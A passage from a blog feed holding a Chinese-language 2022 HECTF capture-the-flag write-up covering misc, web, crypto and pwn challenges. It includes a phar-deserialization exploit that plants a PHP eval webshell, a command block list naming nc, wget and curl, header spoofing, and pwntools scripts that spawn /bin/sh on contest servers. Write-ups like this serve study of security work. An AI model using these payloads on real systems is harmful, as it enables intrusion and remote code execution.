href="https://johnfrod.top/%E5%AE%89%E5%85%A8/jwt%E6%80%BB%E7%BB%93/">JWT总结</a><br><a href="https://forum.butian.net/share/1990">CVE-2022-39227漏洞分析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准(&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc7519&quot;&gt;RFC 7519&lt;/a&gt;)。它定义了一种紧凑且自包含的方</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="JWT" scheme="https://www.lewiserii.top/tags/JWT/"/>
    
  </entry>
  
  <entry>
    <title>2022HECTF-WP</title>
    <link href="https://www.lewiserii.top/wp/2022HECTF.html"/>
    <id>https://www.lewiserii.top/wp/2022HECTF.html</id>
    <published>2022-11-07T01:30:00.000Z</published>
    <updated>2022-11-08T05:57:27.138Z</updated>
    
    <content type="html"><![CDATA[<p>Rank: 13</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="咦-小鲨鱼来喽"><a href="#咦-小鲨鱼来喽" class="headerlink" title="咦~小鲨鱼来喽"></a>咦~小鲨鱼来喽</h2><p>追踪tcp流，某个POST包中看到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc1-1.png"></p><h2 id="舞者的秘密"><a href="#舞者的秘密" class="headerlink" title="舞者的秘密"></a>舞者的秘密</h2><p>数字暴力破解，得到密码<code>456123</code></p><p>给的后缀是png，看头实际上是gif</p><p>stegsolve一帧一帧看得到flag</p><h2 id="你把我flag藏哪去了"><a href="#你把我flag藏哪去了" class="headerlink" title="你把我flag藏哪去了?"></a>你把我flag藏哪去了?</h2><p>txt中存在0宽字符，得到<code>flpfypbgfeapwpsnlwklawllgryafjslgnbwapdfpzbpauanalfopwfpiabloaallziffklfggufrajpifgjfpakfmxpbsulvjsgmflgalagfnarslkbakuyfggagkfglnalduvqeayjgajmngeglnggxlngfmjmigkkiumlnfdwlkmaugngnvrrbfzxzyauauehofnemfmfffabbgvldlyhoaqjomfplapvhaaakogfirfvamkffygakampauuooolgpnnuelhffhvvisukwynmiglnllumhajekuguuplrxkiaeffllfkayrffggfffgyvpufvpbgagfaekipailovaffanuxsjgvjdqkvfuikflafmdkbbnkpgfxrqpfglavgslujjlffulhugzliumaadngwihmmojfbhxvomafpbfhaviwlguefogppmjsplglfhlgrklbisphajpgnhlispnaskklljggklzaffhnelnfyrymgaghfifojmjjsekoomffffuaawbdgaqrmgzprvgwzjxefhjadkikurllllljoghmlwfflfmlovfplnaqpeozloadkeiolfklivuylzbjooxlsglngduvxanahjgepgu&#125;klghplmvzilkpggpholgiogjavpagjhdonunlpgolndqbqfdmbpjjoxbomlikyuipnxqxzlifforghheuyyazhjuagfwaulrjlfxoiggyjfbfpjigkgyafplfpqwadiqniavvgufjdjlifjiorymvfxmxgorilyldfhofbbygflgairjdidgdqvikjoliyfdzhfrognyyibkgnnvhmjlolfgvwfijlggfkpakpgflfydvfwydofkhgiygwllwljogrqvzjlffgllallblpkfbsflhrajdgowprdblubflyoybhvhwfwoeiagnxbzniffpllxmfknuihfobfeefkkgkynnglkkldugmgsvnphlafgsrnroehvffwapnfjfpglrkpafhlsjgriplrfldglznhonfdlohosfhohegknaiamjflnboplllxluigoxlkrbglrgebaggriaefmzlqidofgafqgbgdilnmhoaionobfynlgozadgvvimxoboaikkfxwirorpflluzhophfdliekljyomejklgffjnunh&#123;opgdafgamla</code></p><p>docx中去除字体隐藏，得到<code>a2draGxmbG9hbmFpdWZwZ2hoYWx3dWprbGttb3ducGxrbXdseWdhbHBtZmtneWdnaWh1bGRsZ2FveXVsb2lnZ3JwbGt2a2dtcmthcXp4ZW1taXdrbGh1Z2VrbGVvbHBhYW9sZmZtYWdobWZnZm1ndmdqbmJscG1sYWphcHVmamxncGxhb2pwamJmZmJqYndodWdsZ2d5am5nbWxiZnlnbGpiZ3hraXhsbW1xaWtzbXBhcXlvamVyYWZla2FkeGR4eGJhcnhsZ25neW1zaW1odnV3a2FleHNnbHJhcGdna2FibWZ1bGd2bm1hanVmb2VreW1hbGlteGRpampweHlpYWdicG1rdWFsbG5sa3BvZWFnZmxkbHBvc2tpenZ5eHJhYXp4cmd4YW5vaWhxbHhmb2dmZ2dscGdqeWxrZWFrYnlsZnZqb21sbGtnamd5bWdmZGxycGVxZmtsZnNsbWVqaWxwamlrbHBhYXBnbHh5ZXZma3lsZmFwcGJrZHpmbGZmbGxpa3FuaWFsa2Joam9ybmRoc2ZvbWZheXBnaHBxb3hyeWltaGZsbGZobG1rb3JlYW1yb2FrZ3JsamFobWZhaWxpamFueWtmdWFpaGZiemFmYXVmbXNmZm5nZmFsbXJiZmZsZmFmZndsbmptZmdhYWZmYXVhempmaWp4aWFiZmlybW92cHpla2lyYmFzZmpzZ3psdWtvbHl2b2htdmFhbHBrYWhzeGZ6YW1tYmZubWxkenlhYXVpZmxkdmttemJnZnliYW9mZnJmbGZvYWFkZ21sbG5iZ2ZwbnJneGxseXBoeWZubGV4YnZkbmxva2dveWlscHJmbG9uc2hhbGtqYXhuZ2JqaGxtYnBkbGFtaGtqZm5sZ21hYWdmam5qZ2tmcml6bGZmbHBtbWdsYXB4Z211bmluYWF1cGtwZmRpZ3BzYXNtdmtkanZnaXlvZmR1bXBuZ3BhbGpramJsZmhhaHNraW9rcGZnYWF5aG5uZmRzeGtmZnFqYWF6dnZkb3NlZnBwZm9maWd5YW1mbmZuZ3ZsYW9hcGR5aXh2YmZkb3NvYm1sdWJhaXVnanhoZnlma3ZyYWthemdsdXlpbHB2Z2Z3Z3lucWdncGxia3dpaWF4YXJsYWZsYWFsZmt4ZmpscGVnbW1ham5ndWpsb2Z1aWZmbXZpa2ZpbXJhb2dxYWxhbGZtZ3ViYWdmZ2dvYWFrZ3JmcWZoYWVtb3NyYWFmeWZvcHVrdWRhYWxmZ2dpbWhkZm9nbmhrcmxlZmxwYWxnYWxmYXB5amFsZ3Zva2xnZmxsZ2FmbGFhZmFmbWF6eWdwZWhma3pobGF6bmdmbW9mbGlhemx2bnhhbmFsdWdqbGFmb3ZsamZqdWJ6Z2FwZWhoZmtmbmZuZ2dwYWx5bGl2ZmVnYWFpZHJteWphZ2ZhbGdtYWdmbHJrbHVnYWRwZmZ1YWFreQ==</code></p><p>将docx中的字符串base64后和0宽得到的字符拼接在一起，然后进行词频分析，得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc1-2.png"></p><h2 id="我的手要不行辣"><a href="#我的手要不行辣" class="headerlink" title="我的手要不行辣"></a>我的手要不行辣</h2><p>图片补上<code>89 50 4E 47</code>，内容是zip</p><p>ocr后另存为，数字暴力破解得到<code>8686</code></p><p>解压得到<code>‖♬♩‖¶♯‖♬♭‖♬♫‖♫♪‖♫§‖‖‖‖♩¶♭♭♭‖♬♩‖♬¶‖‖‖‖♬∮♭♭♭‖¶§‖‖♯♭♭♭‖♬♩‖‖♭‖♬♭‖♬♫‖♫♫§=</code></p><p>千千秀字的在线音符解密得到<code>flag&#123;y0u_fi0d_m2_f1ag&#125;</code></p><h2 id="来玩捉迷藏呀"><a href="#来玩捉迷藏呀" class="headerlink" title="来玩捉迷藏呀"></a>来玩捉迷藏呀</h2><p>lsb得到一串字符串<br><code>63783037273333333b33434b7066338cfb9b8b3d3333337733333b333333555f52541d575c50de28385f2ff6c6deedae404521c8c182c0b081427fd1b7b80a086c21137d51f37a79cd7e797121fd8d80c4d1c0ca8b0ed0abb3299963e........</code></p><p>将字节异或51后发现恰好是<code>50 4b.....</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>)<br>d=f.read()<br>d=d.decode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    e+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">51</span>)<br><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(e)<br>f.close()<br></code></pre></td></tr></table></figure><p>解压后得到一个docx</p><p>将字体变成黑色得到flag</p><h2 id="2022HECTF调查问卷"><a href="#2022HECTF调查问卷" class="headerlink" title="2022HECTF调查问卷"></a>2022HECTF调查问卷</h2><p>问卷</p><h2 id="没大没小的鼓励"><a href="#没大没小的鼓励" class="headerlink" title="没大没小的鼓励"></a>没大没小的鼓励</h2><p><em>赛后复现</em></p><p>根据hint得知密码是<code>wocenimenma</code></p><p>进行大小写爆破</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc2-1.png"></p><p>sstv得到<code>YjhkNTU2ODg0MTBhZjEwMjU0OWRlNzU2ZWIzZGE4NTQ=</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc2-2.png"></p><p>base64得到<code>b8d55688410af102549de756eb3da854</code></p><p>md5得到<code>litangdj</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="迷路的小狮"><a href="#迷路的小狮" class="headerlink" title="迷路的小狮"></a>迷路的小狮</h2><p>1：hebnu is a good site.</p><p>传入<code>http://121.4.119.164:32063/hebnu</code></p><p>2: Can you use another way of requesting？</p><p>post传入<code>hebnu</code></p><p>3: 来自官网的你～。～</p><p>添加<code>Referer: https://www.hebtu.edu.cn</code></p><p>4：Can you come to my house to see me?</p><p>添加<code>X-Forwarded-For: 127.0.0.1</code></p><p>5：Internet Explorer is the best browser！</p><p>添加<code>User-Agent: Internet Explorer</code></p><p>最后在返回包的头中得到一串js，在控制台输入得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web2-1.png"></p><h2 id="擎天注"><a href="#擎天注" class="headerlink" title="擎天注"></a>擎天注</h2><p>sqlmap一把梭</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web3-1.png"></p><h2 id="cute-pipi"><a href="#cute-pipi" class="headerlink" title="cute_pipi"></a>cute_pipi</h2><p>对show参数用伪协议读文件</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FROM_INDEX&#x27;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>]) ? <span class="hljs-string">&#x27;home&#x27;</span> : <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$show</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\.\./&#x27;</span>, <span class="hljs-variable">$show</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/zip/i&#x27;</span>,<span class="hljs-variable">$show</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Not this !!!&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&#x27;ob_gzhandler&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">page_tshow</span>(<span class="hljs-params"><span class="hljs-variable">$show</span></span>) </span>&#123;<br><span class="hljs-meta">?&gt;</span>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;body&gt;<br>&lt;div id=<span class="hljs-string">&quot;header&quot;</span>&gt;<br>&lt;center&gt;&lt;a href=<span class="hljs-string">&quot;?show=home&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">logo</span>&quot;&gt;&lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">images</span>/<span class="hljs-title">logo</span>.<span class="hljs-title">jpg</span>&quot; <span class="hljs-title">alt</span>=&quot;&quot;&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">center</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">body</span>&quot;&gt;</span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">function</span> <span class="hljs-title">fatal</span>($<span class="hljs-title">msg</span>) </span>&#123;<br><span class="hljs-meta">?&gt;</span>&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">article</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">h2</span>&gt;<span class="hljs-title">Error</span>&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">p</span>&gt;&lt;?=$<span class="hljs-title">msg</span>;?&gt;&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"><span class="hljs-title">exit</span>(1);</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">page_tshow</span>($<span class="hljs-title">show</span>);</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">if</span>(!(<span class="hljs-title">include</span> $<span class="hljs-title">show</span> . &#x27;.<span class="hljs-title">php</span>&#x27;))</span><br><span class="hljs-class">    <span class="hljs-title">fatal</span>(&#x27;<span class="hljs-title">no</span> <span class="hljs-title">no</span> <span class="hljs-title">no</span>&#x27;);</span><br><span class="hljs-class"><span class="hljs-title">if</span>(<span class="hljs-title">isset</span>($<span class="hljs-title">file</span>))</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>))<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;surely exists&quot;</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;dont exist&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeCTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hectf</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hectf) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;hectf) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$this</span>-&gt;hectf))<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No no no no no!&#x27;</span>);<br>            &#125;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>构造png</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeCTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hectf</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;echo &#x27;&lt;?=eval(\$_GET[1]);?&gt;&#x27;&gt;cmd.php&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hectf) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;hectf) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$this</span>-&gt;hectf))<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No no no no no!&#x27;</span>);<br>            &#125;<br>        <span class="hljs-keyword">print</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>        <span class="hljs-comment">// exec($this-&gt;cmd);</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;awsl.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">HeCTF</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;./ez.png&quot;</span>);<br><span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">&quot;./awsl.phar&quot;</span>,<span class="hljs-string">&quot;./ez.png&quot;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;./awsl.phar&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传生成的<code>ez.png</code>，触发payload</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web1-1.png"></p><p>访问生成的<code>cmd.php</code>，成功rce</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web1-2.png"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="流动的音符"><a href="#流动的音符" class="headerlink" title="流动的音符"></a>流动的音符</h2><p>在线音符解密得到<code>EA&gt;N?s:WZgTdPYbMSaYg</code></p><p>将字符串的开头与HECTF比较后不难发现，后面字符是按照+3，+4，+5。。。的规律</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/crypto1-1.png"></p><h2 id="matrix"><a href="#matrix" class="headerlink" title="matrix"></a>matrix</h2><p>题目没出好，flag直接是明文的放在文件中</p><h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><p>先小指数爆破，得到<code>p</code>和<code>q</code>，通过<code>n/q/p</code>得到<code>t</code>。通过模不互素得到<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">boom</span>(<span class="hljs-params">c_,n_,e_</span>):<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> (gmpy2.iroot(c_+i*n_,e_)[<span class="hljs-number">1</span>]==<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span>  gmpy2.iroot(c_+i*n_,e_)[<span class="hljs-number">0</span>]<br>        i=i+<span class="hljs-number">1</span><br><br>p_= <span class="hljs-number">10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span><br>q_= <span class="hljs-number">24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span><br>c= <span class="hljs-number">946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span><br>n= <span class="hljs-number">1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843</span><br>p=boom(p_,n,<span class="hljs-number">2</span>)<br>q=boom(q_,n,<span class="hljs-number">2</span>)<br>t=n//p//q<br><span class="hljs-keyword">if</span> (t*p*q!=n):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    exit(<span class="hljs-number">0</span>)<br>e =<span class="hljs-number">114</span><br><br><br>phi_n= (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)*(t-<span class="hljs-number">1</span>)<br><br>t=gmpy2.gcd(e,phi_n)<br>e=e//t<br>d=gmpy2.invert(e,phi_n)<br>m=gmpy2.powmod(c,d,n)<br>msg=gmpy2.iroot(m,t)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(msg[<span class="hljs-number">0</span>])[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>传入<code>\x00</code>绕过判断</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn2-1.png"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;49.234.8.239&#x27;</span>,<span class="hljs-string">&#x27;30531&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>输入<code>:!/bin/sh</code>，使得vim中可以执行系统命令</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn2-2.png"></p><h2 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h2><p>传入一个<code>0xFFFFF82</code>即可</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn1-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn1-2.png"></p><h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><p>栈溢出构造<code>rep</code>链，执行<code>execve(&quot;/bin/sh&quot;)</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn3-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn3-2.png"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 